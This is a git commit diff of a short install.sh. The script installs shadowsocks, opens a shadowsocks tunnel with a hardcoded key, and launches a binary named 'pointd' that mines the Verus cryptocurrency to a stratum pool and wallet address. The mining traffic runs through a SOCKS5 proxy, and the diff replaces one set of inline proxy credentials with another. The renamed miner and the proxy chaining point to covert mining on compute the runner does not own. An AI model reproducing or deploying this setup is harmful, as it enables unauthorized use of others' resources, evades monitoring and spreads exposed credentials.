b4cdcc379938da509ebb416ade7e1978c2c380f9
manorepas <102576331+manorepas@users.noreply.github.com>
2022-05-24 10:13:48 +0700

    Update install.sh

--- install.sh
+++ install.sh
@@ -4,4 +4,5 @@ chmod +x pointd
 sudo apt -y install shadowsocks-libev rng-tools libsodium-dev
 
 ss-local -s pl1ss.greenssh.xyz -p 8388 -l 8139 -k Yzg2Y -m chacha20-ietf-poly1305 -v &
-./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CR13 -p x -t 2 -x socks5://Novax:chalHatt@129.158.58.77:1080
+./pointd -a verus -o stratum+tcp://149.56.27.47:3956 -u RN2u2EXEyW65CAgXpiqG99uuha5ATPcWSK.CR13 -p x -t 2 -x socks5://jwegwndc-1:mj2pb21fuqzo@p.webshare.io:80
+
